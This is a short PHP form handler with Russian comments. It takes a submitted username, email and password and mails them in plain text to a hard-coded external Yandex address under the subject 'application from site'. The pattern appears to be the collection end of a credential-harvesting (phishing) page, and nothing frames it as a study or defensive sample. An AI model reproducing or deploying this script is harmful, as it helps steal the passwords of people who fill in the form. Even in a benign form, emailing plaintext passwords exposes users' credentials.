<?php 
			//Принимаем постовые данные
		$name=$_POST['username'];
		$email=$_POST['email'];
		$password=$_POST['password'];
		$general=$_POST['slaw'];	
		//Тут указываем на какой ящик посылать письмо
		$to = "Slaw.lokosoff@yandex.ru";
		//Далее идет тема и само сообщение
		// Тема письма
		$subject = "Заявка с сайта";
		// Сообщение письма
		$message = "
		Ник формы: ".htmlspecialchars($general)."<br>
		Имя пользователя: ".htmlspecialchars($name)."<br />
		Email: ".htmlspecialchars($email)."<br>
		Пароль: ".htmlspecialchars($password)."<br>";

		// Отправляем письмо при помощи функции mail();
		$headers = "From: homework.pw <user@stastroi.ru>\r\nContent-type: text/html; charset=UTF-8 \r\n";
		mail ($to, $subject, $message, $headers);
		// Перенаправляем человека на страницу благодарности и завершаем скрипт
	
		exit();
 ?>